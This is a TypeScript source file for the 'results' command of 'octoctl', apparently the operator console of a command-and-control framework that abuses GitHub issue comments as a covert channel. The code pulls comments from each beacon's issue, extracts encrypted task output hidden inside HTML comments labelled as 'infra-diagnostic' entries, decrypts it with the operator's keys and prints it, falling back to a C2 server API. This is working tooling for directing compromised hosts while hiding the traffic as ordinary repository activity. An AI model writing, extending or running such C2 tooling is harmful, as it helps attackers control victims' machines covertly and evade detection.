/**
 * octoctl results
 *
 * Fetch and decrypt result comments ([job:...:logs:...]) from a beacon's issue.
 *
 * Usage:
 *   octoctl results <beaconId>
 *   octoctl results <beaconId> --last 5
 *   octoctl results <beaconId> --since 2h
 *   octoctl results <beaconId> --json
 */

import { resolveEnv }           from "../lib/env.ts";
import { getBeacon }            from "../lib/registry.ts";
import { openSealBox, bytesToString } from "../lib/crypto.ts";

export interface ResultsOptions {
  last?:  number | undefined;
  since?: string | undefined;
  json:   boolean;
}

// ── Parsed result ─────────────────────────────────────────────────────────────

interface TaskResult {
  taskId:      string;
  beaconId:    string;
  kind?:       string;
  completedAt: string;
  output?:     string;
  error?:      string;
}

// ── Time parsing ──────────────────────────────────────────────────────────────

function parseSince(s: string): Date {
  const m = /^(\d+)(s|m|h|d)$/.exec(s);
  if (m) {
    const n   = parseInt(m[1]!, 10);
    const unit: Record<string, number> = { s: 1000, m: 60_000, h: 3_600_000, d: 86_400_000 };
    return new Date(Date.now() - n * unit[m[2]!]!);
  }
  return new Date(s); // try ISO-8601
}

// ── Comment parsing ───────────────────────────────────────────────────────────

const HEARTBEAT_RE  = /<!--\s*job:(\d+):(reg|ci|logs|deploy):([^\s>]+)\s*-->/m;
// Beacon comments embed the ciphertext inside the infra-diagnostic HTML comment: <!-- infra-diagnostic:epoch:CIPHERTEXT -->
const CIPHERTEXT_RE = /<!--\s*infra-diagnostic:[^\s:>]+:([A-Za-z0-9_\-+/=]+)\s*-->/;

// ── Main ──────────────────────────────────────────────────────────────────────

export async function runResults(beaconIdPrefix: string, opts: ResultsOptions): Promise<void> {
  const env = await resolveEnv();

  const beacon = await getBeacon(beaconIdPrefix, env.dataDir);
  if (!beacon) {
    console.error(
      `\n  Beacon '${beaconIdPrefix}' not found in registry.\n` +
      "  Run: octoctl beacons  to list registered beacons.\n"
    );
    process.exit(1);
  }

  // Determine `since` filter
  const since = opts.since
    ? parseSince(opts.since).toISOString()
    : new Date(Date.now() - 24 * 3600 * 1000).toISOString(); // default: last 24h

  let results: TaskResult[] = [];

  // ── Fetch results: server API or direct Issues comments ─────────────────
  if (beacon.issueNumber === 0) {
    // No issue — beacon registered via Actions/Notes/etc. Use server API.
    const serverUrl = process.env["OCTOC2_SERVER_URL"] ?? "http://localhost:8080";
    const resp = await fetch(`${serverUrl}/api/beacon/${beacon.beaconId}/results`, {
      headers: { "Authorization": `Bearer ${env.token}` },
    });
    if (!resp.ok) {
      throw new Error(`Server returned ${resp.status}: ${await resp.text()}`);
    }
    const serverResults = await resp.json() as Array<{
      taskId: string; beaconId?: string; kind?: string;
      completedAt?: string; output?: string; success?: boolean;
    }>;

    results = serverResults
      .filter(r => new Date(r.completedAt ?? 0) >= new Date(since))
      .map(r => ({
        taskId:      r.taskId,
        beaconId:    r.beaconId ?? beacon.beaconId,
        kind:        r.kind,
        completedAt: r.completedAt ?? new Date().toISOString(),
        output:      r.output,
        error:       r.success === false ? "task failed" : undefined,
      }));

    if (opts.last) results = results.slice(-opts.last);
  } else {
    // Issues-based — fetch and decrypt comments
    const allComments = await env.octokit.paginate(
      env.octokit.rest.issues.listComments,
      {
        owner:        env.owner,
        repo:         env.repo,
        issue_number: beacon.issueNumber,
        since,
        per_page:     100,
      }
    );

    const logsComments = allComments.filter(c =>
      /<!--\s*job:\d+:logs:/m.test(c.body ?? "")
    );

    const limited = opts.last
      ? logsComments.slice(-opts.last)
      : logsComments;

    for (const comment of limited) {
      const hb = HEARTBEAT_RE.exec(comment.body ?? "");
      const ct = CIPHERTEXT_RE.exec(comment.body ?? "");
      if (!hb || !ct) continue;

      try {
        const plain  = await openSealBox(
          ct[1]!.trim(),
          env.operatorPublicKey,
          env.operatorSecretKey
        );
        const result = JSON.parse(bytesToString(plain)) as TaskResult;
        results.push(result);
      } catch (err) {
        results.push({
          taskId:      `<decrypt failed: ${(err as Error).message}>`,
          beaconId:    beacon.beaconId,
          completedAt: comment.created_at,
          error:       "decryption failed",
        });
      }
    }
  }

  if (opts.json) {
    console.log(JSON.stringify(results, null, 2));
    return;
  }

  const DIM   = "\x1b[2m";
  const BOLD  = "\x1b[1m";
  const RESET = "\x1b[0m";
  const GREEN = "\x1b[32m";
  const RED   = "\x1b[31m";
  const CYAN  = "\x1b[36m";

  console.log("");
  console.log(
    `  ${BOLD}Results for ${beacon.hostname}${RESET}  ` +
    `${DIM}(${beacon.beaconId.slice(0, 8)}…, issue #${beacon.issueNumber})${RESET}`
  );

  if (results.length === 0) {
    console.log(`\n  No results in the last ${opts.since ?? "24h"}.\n`);
    return;
  }

  console.log(`  ${DIM}Showing ${results.length} result(s) since ${since}${RESET}`);
  console.log("  " + "─".repeat(72));

  for (const r of results) {
    const hasError  = Boolean(r.error);
    const statusMark = hasError ? `${RED}✗${RESET}` : `${GREEN}✓${RESET}`;

    console.log("");
    console.log(`  ${statusMark}  ${BOLD}${r.taskId.slice(0, 8)}…${RESET}  ${DIM}${r.completedAt}${RESET}`);
    if (r.kind) {
      console.log(`  ${DIM}Kind:${RESET} ${r.kind}`);
    }
    if (r.output && r.output.trim().length > 0) {
      console.log(`  ${CYAN}Output:${RESET}`);
      const lines = r.output.split("\n");
      const preview = lines.slice(0, 20);
      for (const line of preview) {
        console.log(`    ${line}`);
      }
      if (lines.length > 20) {
        console.log(`    ${DIM}… (${lines.length - 20} more lines — use --json to see all)${RESET}`);
      }
    }
    if (r.error && r.error !== "decryption failed") {
      console.log(`  ${RED}Error:${RESET} ${r.error}`);
    }
  }

  console.log("");
}
